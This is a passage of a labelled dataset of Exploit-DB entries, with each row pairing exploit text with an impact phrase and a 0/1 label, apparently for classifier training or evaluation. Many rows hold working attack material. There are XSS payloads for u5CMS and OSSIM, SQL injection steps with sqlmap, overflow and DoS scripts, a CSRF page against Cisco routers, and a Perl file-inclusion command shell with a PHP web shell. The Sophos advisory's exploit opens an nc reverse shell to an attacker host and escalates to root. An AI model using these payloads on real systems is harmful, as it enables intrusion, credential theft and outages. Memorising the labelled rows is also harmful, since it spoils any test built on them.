evil.xml can be updated to read other sensitive files (tested reading file from admin desktop)  ### CVE-2018-10078 Authenticated Stored Cross Site Scripting (XSS) ### This application suffers from authenticated XSS on several inputs (1 of 2 ways) 1. With admin access to application console, under servers tab 	- add dummy IP in server name filed 	- add <script>alert(document.cookie)</script>""> into server description or	 2. With local access to system 	- update 'C:\ProgramData\WatchDog Console\servers.xml file' with following: 		<?xml version=""1.0"" encoding=""utf-8"" standalone=""yes""?> 		<servers> 		<server host=""172.16.1.1"" addrType=""http"" port=""80"" description=""<script>alert(document.cookie)</script>"">"" selEmail=""True"" Username=""1"" Password=""1"" left=""400"" top=""180"" /> 		</servers> 	- restart system  3. popup with cookie appears when browsing from Overview, Dashboard, and Server tabs.  Remains after reboot.  Timeline --------------------------------------------------------------------- 04-14-18: Vendor notified of vulnerabilities 04-16-18: Vendor responded ""Thank you for bringing this to our attention. The product has now been End-of-life for  several years and is no longer receiving updates."" 04-17-18: Submitted public disclosure",reset the application admin password,1
47542,"AUO SunVeillance Monitoring System 1.1.9e - 'MailAdd' SQL Injection # Exploit Title: AUO SunVeillance Monitoring System 1.1.9e - 'MailAdd' SQL Injection # Date: 2019-10-24 # Exploit Author: Luca.Chiou # Vendor Homepage: https://www.auo.com/zh-TW # Version: AUO SunVeillance Monitoring System all versions prior to v1.1.9e # Tested on: It is a proprietary devices: https://solar.auo.com/en-global/Support_Download_Center/index # CVE: N/A  # 1. Description: # AUO SunVeillance Monitoring System all versions prior to v1.1.9e that is vulnerable to SQL Injection. # The vulnerability can allow the attacker inject maliciously SQL command to the server which allows  # the attacker to read privileged data.  # 2. Proof of Concept:  (1) Access the sending mail page of AUO SunVeillance Monitoring System  (/Solar_Web_Portal/mvc_send_mail.aspx) without any authentication.      There is a parameter, MailAdd, in mvc_send_mail.aspx. (2) Modify the value of parameter MailAdd with single quotation. The error messages contains oracle database information. (3) By using sqlmap tools, attacker can acquire the database list which in server side.  cmd: sqlmap.py -u “https://<host>/Solar_Web_Portal/mvc_send_mail.aspx?MailAdd=” -p MailAdd –dbs  (4) Furthermore, there are a few SQL Injection vulnerabilities in other fields.  picture_manage_mvc.aspx (parameter: plant_no) swapdl_mvc.aspx (parameter: plant_no) account_management.aspx (parameter: Text_Postal_Code, Text_Dis_Code)  Thank you for your kind assistance.  Luca",inject maliciously SQL command to the server which allows the attacker to read privileged data,1
38687,"Sam Spade 1.14 - S-Lang Command Field Overflow (SEH) #!/usr/bin/env python # Exploit Title     : Sam Spade 1.14 S-Lang Command Field SEH Overflow Crash PoC # Discovery by      : Nipun Jaswal # Email             : mail@nipunjaswal.info # Discovery Date    : 12/11/2015 # Vendor Homepage   : http://samspade.org # Software Link     : http://www.majorgeeks.com/files/details/sam_spade.html # Tested Version    : 1.14 # Vulnerability Type: Denial of Service (DoS) Local # Tested on OS      : Windows XP Professional SP2 x86 es # Crash Point       : Go to Tools > S-Lang Command> Enter the contents of 'sam_spade_slang_dos.txt' > OK , Note: Do Not Remove the round bracket ########################################################################################## #  -----------------------------------NOTES----------------------------------------------# ########################################################################################## # And the Stack #00FBFE80   41414141  AAAA #00FBFE84   41414141  AAAA #00FBFE88   42424242  BBBB  Pointer to next SEH record #00FBFE8C   43434343  CCCC  SE handler  # After the execution of POC, the SEH chain looks like this:  #Address    SE handler #00FBFE88   43434343 #42424242   *** CORRUPT ENTRY ***  f = open(""sam_spade_slang_dos.txt"", ""w"") Junk_a = ""A""*528 nseh= ""B"" * 4 seh= ""C"" *4  f.write(Junk_a+nseh+seh) f.close()",Denial of Service (DoS,1
31587,EasySite 2.0 - 'browser.php' Remote File Inclusion source: https://www.securityfocus.com/bid/28563/info  EasySite is prone to multiple remote file-include vulnerabilities because it fails to sufficiently sanitize user-supplied data.  Exploiting these issues may allow an attacker to compromise the application and the underlying system; other attacks are also possible.  EasySite 2.0 is vulnerable; other versions may also be affected.  http://www.example.com/Easysite-2.0_path/configuration/browser.php?EASYSITE_BASE=ZoRLu.txt?,fails to sufficiently sanitize user-supplied data,0
28175,"Sophos Web Protection Appliance - Multiple Vulnerabilities Core Security - Corelabs Advisory http://corelabs.coresecurity.com/  Sophos Web Protection Appliance Multiple Vulnerabilities   1. *Advisory Information*  Title: Sophos Web Protection Appliance Multiple Vulnerabilities Advisory ID: CORE-2013-0809 Advisory URL: http://www.coresecurity.com/advisories/sophos-web-protection-appliance-multiple-vulnerabilities Date published: 2013-09-06 Date of last update: 2013-09-06 Vendors contacted: Sophos Release mode: Coordinated release   2. *Vulnerability Information*  Class: OS command injection [CWE-78], OS command injection [CWE-78] Impact: Code execution, Security bypass Remotely Exploitable: Yes Locally Exploitable: No CVE Name: CVE-2013-4983, CVE-2013-4984   3. *Vulnerability Description*  Sophos Web Protection Appliance [1] provides advanced web malware protection, URL filtering and content control (including scanning of HTTPS traffic) in a Secure Web Gateway appliance. Sophos Web Protection Appliance is available both as a hardware appliance and as a VMware virtual appliance.  Multiple vulnerabilities have been found in Sophos Web Protection Appliance that could allow an unauthenticated remote attacker to execute arbitrary OS commands and escalate privileges to gain root permissions within the appliance. The OS command injection vulnerability can be exploited by remote unauthenticated attackers that can reach the web interface of the appliance. The privilege escalation vulnerability allows an attacker that already gained code execution on the appliance to escalate privileges from the operating system user 'spiderman' to 'root'.   4. *Vulnerable Packages*     . Sophos Web Appliance v3.7.9 and earlier.    . Sophos Web Appliance v3.8.0.    . Sophos Web Appliance v3.8.1.    . Other versions may be affected too but they were no checked.  5. *Non-Vulnerable Packages*     . Sophos Web Protection Appliance v3.7.9.1.    . Sophos Web Protection Appliance v3.8.1.1.  6. *Vendor Information, Solutions and Workarounds*  Sophos published release notes and a knowledgebase article acknowledging the issue and the assistance given by Core Security in tracking it down [2][3].   7. *Credits*  This vulnerability was discovered and researched by Francisco Falcon from Core Exploit Writers Team. The publication of this advisory was coordinated by Fernando Miranda from Core Advisories Team.   8. *Technical Description / Proof of Concept Code*      8.1. *Pre-authentication OS command injection vulnerability*  [CVE-2013-4983] The file '/opt/ui/apache/htdocs/end-user/index.php' can be accessed by unauthenticated users at 'https://<WPA_server>/end-user/index.php'. It also can be reached through plain HTTP at 'http://<WPA_server>/index.php', since Apache's 'httpd.conf' configuration file defines a VirtualHost at port 80 having DocumentRoot '/opt/ui/apache/htdocs/end-user/'. The 'run()' function in this PHP script obtains the requested controller from its 'c' GET parameter and calls the appropriate handler.  Available handlers are defined in '/opt/ui/apache/htdocs/config/UsrSiteflow.php':   /----- <?php require_once('AbstractSiteFlow.php'); class UsrSiteflow extends AbstractSiteFlow {     public function __construct() {         $this->flow = array(             ""index"" => ""UsrBlocked.php"",             ""blocked"" => ""UsrBlocked.php"",                     ""invalid_certificate"" => ""UsrBlocked.php"",             ""rss"" => ""UsrRss.php"",         );     } } ?> -----/  That means that, for example, when requesting 'https://<WPA_server>/end-user/index.php?c=blocked', the 'UsrBlocked.php' script will be used to render the page. Looking at the code in '/opt/ui/apache/htdocs/controllers/UsrBlocked.php':  /----- <?php [...]     if(isset($_GET['action'])) {     if($_GET['action'] == 'continue') {                 // use sblistpack to allow access                 $url = base64_decode($_POST['url']);         $scheme = parse_url($url,PHP_URL_SCHEME);         if($scheme == ""https"" && $this->config->read('wsa_proxy.https_scan') != 'yes') {         $host = parse_url($url,PHP_URL_HOST);         $args['url'] = $scheme . '://' . $host;         } else {         $args['url'] = $url;                 }         if($_POST['args_reason'] == 'filetypewarn') {         $key = $_POST['url'];         $packer = '/opt/ws/bin/ftsblistpack';         $value = $_POST['filetype'];         }         else {             $key = $_POST['domain'];             $packer = '/opt/ws/bin/sblistpack';             $catParts = explode(""|"",$_POST['raw_category_id']);             $value = $catParts[0];         }         if(strlen(trim($_POST['user'])) > 0)             $user = base64_decode($_POST['user_encoded']);         else             $user = $_POST['client-ip'];             if($user == '-') $user = $_POST['client-ip'];              $key = escapeshellarg($key);             $user = escapeshellarg($user);             $value = escapeshellarg($value);         shell_exec(""$packer $key $user $value""); [...] ?>       -----/  we can see that the Perl script '/opt/ws/bin/sblistpack' will be executed when the following conditions are met:     1. the 'action' GET parameter is set to 'continue', and    2. the 'args_reason' POST parameter is set to anything different that 'filetypewarn'; Variables whose content is controlled by the user '($key, $user, $value)' are properly escaped by using 'escapeshellarg()' before calling 'shell_exec()', making the UsrBlocked.php script not vulnerable to OS command injection at that point. However, the invoked '/opt/ws/bin/sblistpack' Perl script itself is vulnerable to OS command injection, because its 'get_referers()' function doesn't escape the first argument of the script before using it within a string that will be executed as a command by using backticks:   /----- sub get_referers {     my $domain = shift;      if(! -f $referer_list) {         return ();     }      # handle multiple google domains (e.g. google.co.uk)     if($domain =~ /^google\./) {         $domain = 'google.com';     }      my $output = `/opt/ws/bin/kvlistquery $referer_list $domain`;     chomp $output;      if($output =~ /'(.*)'$/) {         my $sites = $1;         return split('\|', $sites);     }     return (); }  -----/  so, by setting the 'domain' POST parameter to a value like:   /----- http://example.com;/bin/nc -c /bin/bash 192.168.1.100 4444 -----/  an unauthenticated remote attacker can execute arbitrary OS commands on the Sophos appliance with the privileges of the 'spiderman' operating system user.   8.1.1. *Proof of Concept*  The following Python script exploits the pre-authentication OS command injection vulnerability and executes '/bin/nc -c /bin/bash 192.168.1.100 4444' on a vulnerable Sophos Web Protection Appliance in order to gain a reverse shell on attacker's machine at 192.168.1.100:   /----- import sys import httplib  def main():     if len(sys.argv) < 2:         print ""Usage: sophos_wpa_command_injection.py <target_ip>""         sys.exit(1)      host = sys.argv[1]     port = 443      headers = {'Host': host,                'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko/20100101 Firefox/21.0',                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',                'Accept-Language': 'es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3',                'Accept-Encoding': 'gzip, deflate',                'Connection': 'keep-alive',                'Content-Type': 'application/x-www-form-urlencoded'                }      body  = 'url=aHR0cDovL3d3dy5leGFtcGxlLmNvbQ%3d%3d'     body += '&args_reason=something_different_than_filetypewarn&filetype=dummy&user=buffalo'     body += '&user_encoded=YnVmZmFsbw%3d%3d&domain=http%3a%2f%2fexample.com%3b%2fbin%2fnc%20-c%20%2fbin%2fbash%20192.168.1.100%204444'     body += '&raw_category_id=one%7ctwo%7cthree%7cfour'      conn = httplib.HTTPSConnection(host, port)     conn.request('POST', '/end-user/index.php?c=blocked&action=continue', body=body, headers=headers)          #Don't wait for the server response since it will be blocked by the spawned shell     conn.close()     print 'Done.'  if __name__ == '__main__':     main()       -----/   8.2. *Privilege escalation through local OS command injection vulnerability*  [CVE-2013-4984] The Apache web server within the Sophos appliance runs under the 'spiderman' user. The '/etc/sudoers' file defines a list of Bash and Perl scripts that the 'spiderman' user can run with the 'sudo' command:   /----- spiderman ALL=NOPASSWD:/opt/sophox/bin/configure_interface, \                        /opt/sophox/bin/sophox-register, \                        /opt/sophox/bin/sophox-remote-assist, \                        [...]                        /opt/cma/bin/clear_keys.pl, \                        [...] -----/  The Perl script '/opt/cma/bin/clear_keys.pl' is vulnerable to OS command injection, because its 'close_connections()' function:   /----- sub close_connections {     my ($client_ip, $signum, $signame) = @_;      my @connections = `/bin/netstat -nap|grep ^tcp.*:22.*$client_ip.*EST`;     foreach (@connections) {         if(/ESTABLISHED\s*(\d+)\/sshd/) {             my $conn_pid = $+;             log_info(""connection PID: $conn_pid; my PID: $$; my process tree: "" . join(', ', @my_process_tree));             next if (grep {$_ == $conn_pid}  @my_process_tree);             log_info(""Attempting to stop process '$conn_pid' with $signame"");             kill $signum, $conn_pid;         }     } }       -----/  doesn't escape the second argument of the script before using it within a string that will be executed as a command by using backticks. Since it can be run by the 'spiderman' user with the 'sudo' command, it can be abused to gain root privileges within the appliance.  The following command can be executed within a compromised Web Protection Appliance to escalate privileges from 'spiderman' user to root and gain a reverse root shell on attacker's machine at 192.168.1.100:   /----- $ sudo /opt/cma/bin/clear_keys.pl fakeclientfqdn "";/bin/nc -c /bin/bash 192.168.1.100 5555;"" /fakedir -----/   9. *Report Timeline*  . 2013-08-12: Core Security Technologies notifies the Sophos team of the vulnerability and sends a technical report. Publication date is set for Sep 4th, 2013.  . 2013-08-13: Vendor acknowledges Core Security Technologies's e-mail, confirms the issues and notifies that they are working on a resolution and a release plan.  . 2013-08-14: Vendor notifies that they are expecting to release a fixed version in the first week of September. Vendor also notifies that they are also in the middle of an extended rollout of a new version of the product and would like to make this fix available to customers on both the new and old versions of the product, which increases the amount of testing involved. Sophos team asks for delay the advisory publication one week (Sep 11th).  . 2013-08-20: Core re-schedules the advisory publication for Sep 11th, 2013.  . 2013-09-05: Vendor notifies that they completed the testing early and the fixed version of the Web Appliance is scheduled for tomorrow, Friday 6th. Vendor also notifies that they have published release notes and a knowledgebase article acknowledging the issues [2][3].  . 2013-09-06: Advisory CORE-2013-0809 published.   10. *References*  [1] http://www.sophos.com/medialibrary/PDFs/factsheets/sophoswebappliancesdsna.pdf.  [2] http://www.sophos.com/en-us/support/knowledgebase/119773.aspx. [3] http://ca-repo1.sophos.com/docs/ws1000/ws1000/concepts/ReleaseNotes_3.8.1.1.html.    11. *About CoreLabs*  CoreLabs, the research center of Core Security Technologies, is charged with anticipating the future needs and requirements for information security technologies. We conduct our research in several important areas of computer security including system vulnerabilities, cyber attack planning and simulation, source code auditing, and cryptography. Our results include problem formalization, identification of vulnerabilities, novel solutions and prototypes for new technologies. CoreLabs regularly publishes security advisories, technical papers, project information and shared software tools for public use at: http://corelabs.coresecurity.com.   12. *About Core Security Technologies*  Core Security Technologies enables organizations to get ahead of threats with security test and measurement solutions that continuously identify and demonstrate real-world exposures to their most critical assets. Our customers can gain real visibility into their security standing, real validation of their security controls, and real metrics to more effectively secure their organizations.  Core Security's software solutions build on over a decade of trusted research and leading-edge threat expertise from the company's Security Consulting Services, CoreLabs and Engineering groups. Core Security Technologies can be reached at +1 (617) 399-6980 or on the Web at: http://www.coresecurity.com.   13. *Disclaimer*  The contents of this advisory are copyright (c) 2013 Core Security Technologies and (c) 2013 CoreLabs, and are licensed under a Creative Commons Attribution Non-Commercial Share-Alike 3.0 (United States) License: http://creativecommons.org/licenses/by-nc-sa/3.0/us/   14. *PGP/GPG Keys*  This advisory has been signed with the GPG key of Core Security Technologies advisories team, which is available for download at http://www.coresecurity.com/files/attachments/core_security_advisories.asc.",execute arbitrary OS commands on the Sophos appliance with the privileges of the 'spiderman' operating system user,1
32391,"Cisco 871 Integrated Services Router - Cross-Site Request Forgery (2) source: https://www.securityfocus.com/bid/31218/info   The Cisco 871 Integrated Services Router is prone to a cross-site request-forgery vulnerability.   Successful exploits can run arbitrary commands on affected devices. This may lead to further network-based attacks.   The 871 Integrated Services Router under IOS 12.4 is vulnerable; other products and versions may also be affected.   <!-- Jeremy Brown [0xjbrown41@gmail.com/http://jbrownsec.blogspot.com] Cisco Router HTTP Administration CSRF Remote Command Execution Universal Exploit #2 Replace ""example.com"" with the IP address of the target router, embed this in a web page and hope for the best. Cisco Admin's + Safari are the best targets ;) --> <html> <body> <body onload=""fdsa.submit();""> <form name=fdsa method=""post"" action=""http://example.com/level/15/exec/-/configure/http""> <input type=hidden name=command value=""alias exec xx xx""> <input type=hidden name=command_url value=""/level/15/exec/-""> <input type=hidden name=new_command_url value=""/level/15/configure/-""> </body> </html>",run arbitrary commands on affected devices,1
46872,"PCL Converter 2.7 - Denial of Service (PoC) # -*- coding: utf-8 -*- # Exploit Title: VeryPDF PCL Converter v2.7 - Denial of Service (PoC) # Date: 19/05/2019 # Author: Alejandra Sánchez # Vendor Homepage: http://www.verypdf.com # Software: http://www.verypdf.com/pcltools/pcl-converter.exe # Version: 2.7 # Tested on: Windows 10  # Proof of Concept: # 1.- Run the python script ""PCLConverter.py"", it will create a new file ""PCLConverter.txt"" # 2.- Copy the text from the generated PCLConverter.txt file to clipboard # 3.- Open VeryPDF PCL Converter v2.7  # 4.- Go to 'Setting' > 'PDF Security' # 5.- Mark 'Encrypt PDF File' and paste clipboard in the field 'User Password' or the field 'Master Password' and Click 'OK' # 6.- Click on 'Add File(s)', and select a pcl file, e.g. 'sample.pcl' # 7.- Click on 'Start', you will see a crash  buffer = ""\x41"" * 3000 f = open (""PCLConverter.txt"", ""w"") f.write(buffer) f.close()",denial of service,1
36029,"u5CMS 3.9.3 - Multiple Persistent Cross-Site Scripting / Reflected Cross-Site Scripting Vulnerabilities ﻿ u5CMS 3.9.3 Multiple Stored And Reflected XSS Vulnerabilities   Vendor: Stefan P. Minder Product web page: http://www.yuba.ch Affected version: 3.9.3 and 3.9.2  Summary: u5CMS is a little, handy Content Management System for medium-sized websites, conference / congress / submission administration, review processes, personalized serial mails, PayPal payments and online surveys based on PHP and MySQL and Apache.  Desc: u5CMS suffers from multiple stored and reflected cross-site scripting vulnerabilities. Input passed to several POST and GET parameters is not properly sanitised before being returned to the user. This can be exploited to execute arbitrary HTML and script code in a user's browser session in context of an affected site.  Tested on: Apache 2.4.10 (Win32)            PHP 5.6.3            MySQL 5.6.21   Vulnerabilities discovered by Gjoko 'LiquidWorm' Krstic                               @zeroscience   Advisory ID: ZSL-2015-5223 Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2015-5223.php   29.12.2014  ---   Reflected XSS: ==============  GET /u5cms/index.php?c=start""><script>alert(1)</script>&l=e&p=1&r= HTTP/1.1 GET /u5cms/index.php?i=1""><script>alert(2)</script>&p=1&c=start&l=d HTTP/1.1 GET /u5cms/index.php?c=start&l=e""><script>alert(3)</script>&p=1&r= HTTP/1.1 GET /u5cms/index.php?c=start&l=e&p=1""><script>alert(4)</script>&r= HTTP/1.1 GET /u5cms/u5admin/cookie.php?a=i2_l%00%3balert(5)//&b=d HTTP/1.1 GET /u5cms/u5admin/cookie.php?a=i2_l&b=%3balert(6)// HTTP/1.1 GET /u5cms/u5admin/copy.php?name=album""><img%20src%3da%20onerror%3dalert(7)> HTTP/1.1 GET /u5cms/u5admin/delete.php?name=a""><img%20src%3da%20onerror%3dalert(8)> HTTP/1.1 GET /u5cms/u5admin/deletefile.php?typ=d&name=shortreference&f=../r/shortreference/shortreference_en.php.txt'%3balert(9)// HTTP/1.1 GET /u5cms/u5admin/deletefile.php?typ=d'%3balert(10)//&name=shortreference&f=../r/shortreference/shortreference_en.php.txt HTTP/1.1 GET /u5cms/u5admin/done.php?n=inserted%20test""><script>alert(11)</script> HTTP/1.1 GET /u5cms/u5admin/editor.php?c=c""><script>alert(12)</script> HTTP/1.1 POST /u5cms/u5admin/meta2.php?typ=a&uri=metai.php'%3balert(13)// HTTP/1.1 GET /u5cms/u5admin/notdone.php?n=wrong%20name,%20not%20deleted%20<script>alert(14)</script> HTTP/1.1 GET /u5cms/u5admin/rename2.php?name=valbum&newname=valbum'%3balert(15)//&typ=a HTTP/1.1 GET /u5cms/u5admin/sendfile.php?name=shortreference&l=_frd""><script>alert(16)</script>&typ=d HTTP/1.1 GET /u5cms/u5admin/characters.php?more=335&s=335""><script>alert(17)</script> HTTP/1.1   Stored XSS: ===========  <html>   <body>     <form action=""http://10.0.50.3/u5cms/u5admin/savepage.php"" method=""POST"">       <input type=""hidden"" name=""page"" value='ZSL""><script>alert(document.cookie);</script>' />       <input type=""hidden"" name=""view"" value=""d"" />       <input type=""hidden"" name=""ishomepage"" value=""1"" />       <input type=""hidden"" name=""hidden"" value=""0"" />       <input type=""hidden"" name=""logins"" value="""" />       <input type=""hidden"" name=""title_d"" value=""Test"" />       <input type=""hidden"" name=""desc_d"" value="""" />       <input type=""hidden"" name=""key_d"" value="""" />       <input type=""hidden"" name=""content_d"" value=""Tstz"" />       <input type=""hidden"" name=""title_e"" value=""ZSL"" />       <input type=""hidden"" name=""desc_e"" value=""llll"" />       <input type=""hidden"" name=""key_e"" value=""qqq"" />       <input type=""hidden"" name=""content_e"" value=""AllTheWay"" />       <input type=""hidden"" name=""title_f"" value=""None"" />       <input type=""hidden"" name=""desc_f"" value="""" />       <input type=""hidden"" name=""key_f"" value="""" />       <input type=""hidden"" name=""content_f"" value=""Aloha"" />       <input type=""hidden"" name=""coco"" value=""1423010603"" />       <input type=""submit"" value=""Submit form"" />     </form>   </body> </html>   --   <html>   <body>     <form action=""http://10.0.50.3/u5cms/u5admin/new2.php?typ=e"" method=""POST"">       <input type=""hidden"" name=""name"" value='""><img%20src%3da%20onerror%3dalert(""XSS"")>' />       <input type=""hidden"" name=""typ"" value=""e"" />       <input type=""submit"" value=""Submit form"" />     </form>   </body> </html>",execute arbitrary HTML and script code in a user's browser session in context of an affected site,1
20436,"Apple Mac OSX 10 / HP-UX 9/10/11 / Mandriva 6/7 / RedHat 5/6 / SCO 5 / IRIX 6 - Shell Redirection Race Condition source: https://www.securityfocus.com/bid/2006/info  bash, tcsh, cash, ksh and sh are all variations of the Unix shell distributed with many Unix and Unix clone operating systems. A vulnerability exists in these shells that could allow an attacker to arbitrarily write to files.  A vulnerability has been discovered in a number of Unix shells which may allow a local attacker to corrupt files or potentially elevate privileges.  Scripts and command line operations using << as a redirection operator create files in the /tmp directory with a predictable naming convention. Additionally, files are created in the /tmp directory without first checking if the file already exists.  This could result in a symbolic link attack that could be used to corrupt any file that the owner of the redirecting shell has access to write to. This issue affects those systems running vulnerable versions of bash, tcsh, cash, ksh and sh.  ksh is reportedly not vulnerable for IBM AIX systems.   #!/bin/ksh -x touch /tmp/silly.1 ln -s /tmp/silly.1 /tmp/sh$$.1 ls -l /tmp/silly.* /tmp/sh$$.* cat <<EOF Just some short text EOF ls -l /tmp/silly.* /tmp/sh$$.* rm /tmp/silly.* /tmp/sh$$.*  This example was submitted by proton <proton@energymech.net> in an October 29th, 2001 BugTraq posting:  /tmp# echo 'hello world' > rootfile /tmp# chmod 600 rootfile /tmp# ln -s rootfile sh$$ /tmp# chown -h 666.666 sh$$ /tmp# ls -l rootfile sh$$ -rw------- 1 root root 12 Oct 29 03:55 rootfile lrwxrwxrwx 1 666 666 8 Oct 29 03:56 sh12660 -> rootfile /tmp# cat <<BAR ? FOO ? BAR FOO o world /tmp# ls -l rootfile sh$$ /bin/ls: sh12660: No such file or directory -rw------- 1 root root 12 Oct 29 03:56 rootfile /tmp# cat rootfile FOO o world /tmp#",arbitrarily write to files,1
19803,"Sam Hawker wmcdplay 1.0 beta1-2 - Local Buffer Overflow (2) source: https://www.securityfocus.com/bid/1047/info   wmcdplay is cdplayer generally used with the WindowMaker X11 window-manager on unix systems. While wmcdplay is rarely installed at all by default, when it is installed it is typically set setuid root. wmcdplay is vulnerable to a buffer overflow attack due to lack of bounds checking on an argument it is passed. As a result, a local user can elevate their priviliges to root through overruning the stack and executing arbitrary code with the effective user-id of the process (root).  https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/19803.tar.gz",elevate their priviliges to root through overruning the stack and executing arbitrary code,1
2628,"JumbaCMS 0.0.1 - '/includes/functions.php' Remote File Inclusion #!/usr/bin/perl # # JumbaCMS Build 2 Remote Command Execution Vulnerability # # Risk : High (Remote Code Execution) # # Url: http://jumbacms.googlecode.com/svn/trunk/ # # Exploit: #   http://site.com/[path]/includes/functions.php?jcms_root_path=[Evil_Script] # w0rks only if php<5 ! c0de: #      if (version_compare(phpversion(), ""5.0.0"", ""<"")) #         { #	     include($jcms_root_path.""includes/file_put_contents."".$phpEx); #          } # # (c)oded and f0und3d by Kw3[R]Ln <ciriboflacs[AT]YaHOo.com> # # Romanian Security Team .: hTTp://RST-CREW.NET :. # # Shoutz to [Oo], str0ke, th0r and all members of RST !  use LWP::Simple;  print ""...........................[RST]...............................\n""; print "".                                                             .\n""; print "".        JumbaCMS remote Command Execution Vulnerability      .\n""; print "".                                                             .\n""; print ""...............................................................\n""; print "".       Romanian Security Team -> hTTp://RST-CREW.NET         .\n""; print "".       [c]oded by Kw3rLN - kw3rln[AT]rst-crew.net            .\n""; print ""...............................................................\n\n"";  my $kw3,$path,$shell,$conexiune,$cmd,$data ;   if ((!$ARGV[0]) || (!$ARGV[1])) { &usage;exit(0);}  $path = $ARGV[0]; chomp($path); $shell = $ARGV[1]; chomp($shell);  $path = $path.""/includes/functions.php"";   sub usage(){ 	print ""Usage    : perl $0 host/path http://site.com/cmd.txt\n\n""; 	print ""Example  : perl $0 http://127.0.0.1 http://site.com/cmd.txt\n\n"";         print 'Shell    : <?php ob_clean();ini_set(""max_execution_time"",0);passthru($_GET[""cmd""]);die;?>';            }  while () { print ""[kw3rln].[rst] :~\$ ""; chomp($cmd=<STDIN>); if ($cmd eq ""exit"") { exit(0);}  $kw3 = $path.""?jcms_root_path="".$shell.""?&cmd="".$cmd; if ($cmd eq """")   { print ""Enter your command !\n""; } else   { $data=get($kw3); print $data ; } }  # milw0rm.com [2006-10-23]",Command Execution,1
18654,"Spotify 0.8.2.610 - search func Memory Exhaustion #!/usr/local/bin/perl # # Spotify 0.8.2.610 (search func) Memory Exhaustion Exploit # # # Vendor: Spotify Ltd # Product web page: http://www.spotify.com # Affected version: 0.8.2.610.g090a06f8 # # Summary: Think of Spotify as your new music collection. Your # library. Only this time your collection is vast: millions of # tracks and counting. Spotify comes in all shapes and sizes, # available for your PC, Mac, home audio system and mobile phone. # Wherever you go, your music follows you. # # Desc: The vulnerability is caused due to the Search box function # not checking the boundary of user input. This can be exploited to # cause a DoS due to memory exhaustion when inserting a long string # of bytes (~80mil B / 80 MB) into the Search field in the GUI. # # Tested on: Microsoft Windows XP Professional SP3 (EN) (32bit) #            Microsoft Windows 7 Ultimate SP1 (EN) (64bit) # # Vulnerability discovered by Claes Spett # Coded by LiquidWorm # # Vendor status: # # [19.03.2012] Vulnerability discovered. # [22.03.2012] Vendor has some knowledge about the issue. # [23.03.2012] Public security advisory released. # # # Advisory ID: ZSL-2012-5082 # Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2012-5082.php # # # 21.03.2012 #  use Win32::Clipboard; $leepy = Win32::Clipboard(); print ""\n[i] Clearing your Clipboard data...\n""; sleep 2; print ""\n - Done!\n""; sleep 1; $leepy->Empty(); $tring = ""\x41"" x 70000000; $leepy->Set($tring); print ""\n\n*----- Log In and just Paste \/ CTRL+V""; print "" into the search box -----*\n\n""; system pause; print ""\n\n[*] Starting Spotify\n""; sleep 1; system('start C:\\Docume~1\\%username%\Applic~1\\Spotify\\spotify.exe');",DoS,1
24809,"Kerio Personal Firewall 2.1.x/4.x - Local Denial of Service source: https://www.securityfocus.com/bid/11859/info  It is reported that the Kerio Personal Firewall (KPF) driver does not sufficiently sanitize API parameters that are received from API's that are hooked by KPF. When the KPF API hook handles certain parameter data it will fail. Reports indicate that this exception is not expected and as a result, the Windows kernel crashes triggering a system wide denial of service.  A local attacker may exploit this vulnerability to deny service to legitimate users.  _asm{   xor ebx,ebx   start:   mov     eax,ebx   mov     edx,0x00010001 //writable mem area could be any value   int     0x2e   inc ebx   jmp start }",denial of service,1
38679,"Alienvault Open Source SIEM (OSSIM) - Multiple Cross-Site Scripting Vulnerabilities source: https://www.securityfocus.com/bid/61456/info  Open Source SIEM (OSSIM) is prone to multiple cross-site-scripting vulnerabilities because it fails to properly sanitize user-supplied input.  An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.  Open Source SIEM (OSSIM) 4.2.3 is vulnerable; other versions may also be affected.  https:// <IP>/ossim/vulnmeter/index.php?withoutmenu=%22%3E%3Cimg%20src%3da%20onerror%3dalert%28%27XSS%27%29%3E https:// <IP>/ossim/vulnmeter/sched.php?smethod=schedule&hosts_alive=1&scan_locally=1&withoutmenu=""><img%20src%3da%20onerror%3dalert('XSS')> https:// <IP>/ossim/av_inventory/task_edit.php?section=""><img%20src%3da%20onerror%3dalert('XSS')> https:// <IP>/ossim/nfsen/rrdgraph.php?cmd=get-detailsgraph&profile=<img%20src%3da%20onerror%3dalert('XSS')>  POST /ossim/vulnmeter/simulate.php HTTP/1.1 Host: <IP> User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:21.0) Gecko/20100101 Firefox/21.0 Accept: */* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded; charset=UTF-8 X-Requested-With: XMLHttpRequest Referer: https:// <IP>/ossim/vulnmeter/sched.php?smethod=schedule&hosts_alive=1&scan_locally=1&withoutmenu=1 Content-Length: 72 Cookie: JXID=blahblah; JXHID=false; PHPSESSID=blahblah Connection: keep-alive Pragma: no-cache Cache-Control: no-cache  hosts_alive=1&scan_locally=1&not_resolve=0&scan_server=<img%20src%3da%20onerror%3dalert('XSS')>&targets=blah   POST /ossim/vulnmeter/simulate.php HTTP/1.1 Host: <IP> User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:21.0) Gecko/20100101 Firefox/21.0 Accept: */* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded; charset=UTF-8 X-Requested-With: XMLHttpRequest Referer: https:// <IP>/ossim/vulnmeter/sched.php?smethod=schedule&hosts_alive=1&scan_locally=1&withoutmenu=1 Content-Length: 72 Cookie: JXID=blahblah; JXHID=false; PHPSESSID=blahblah Connection: keep-alive Pragma: no-cache Cache-Control: no-cache  hosts_alive=1&scan_locally=1&not_resolve=0&scan_server=Null&targets=blah<img%20src%3da%20onerror%3dalert('XSS')>",execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site,1
